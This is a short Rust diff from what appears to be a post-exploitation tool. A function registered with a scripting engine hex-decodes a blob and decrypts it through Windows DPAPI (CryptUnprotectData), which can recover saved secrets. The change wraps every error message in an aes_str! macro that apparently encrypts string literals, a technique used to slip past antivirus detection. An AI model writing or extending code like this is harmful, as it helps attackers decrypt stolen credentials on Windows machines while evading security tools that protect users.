@@ -17,12 +17,12 @@ pub fn register(engine: &mut Engine) {
         {
             let mut data = match hex::decode(blob_hex) {
                 Ok(d)  => d,
-                Err(e) => return format!("Error: {}", e),
+                Err(e) => return format!("{}{}", aes_str!("Error: "), e),
             };
             let mut entropy = if !entropy_hex.is_empty() {
                 match hex::decode(entropy_hex) {
                     Ok(d)  => d,
-                    Err(e) => return format!("Error: {}", e),
+                    Err(e) => return format!("{}{}", aes_str!("Error: "), e),
                 }
             } else {
                 Vec::new()
@@ -46,7 +46,7 @@ pub fn register(engine: &mut Engine) {
                     &mut blob_out,
                 );
                 if ok == 0 {
-                    return format!("Error: CryptUnprotectData failed ({})", GetLastError());
+                    return format!("{}{})", aes_str!("Error: CryptUnprotectData failed ("), GetLastError());
                 }
                 let plaintext = std::slice::from_raw_parts(blob_out.pb, blob_out.cb as usize).to_vec();
                 LocalFree(blob_out.pb as *mut std::ffi::c_void);
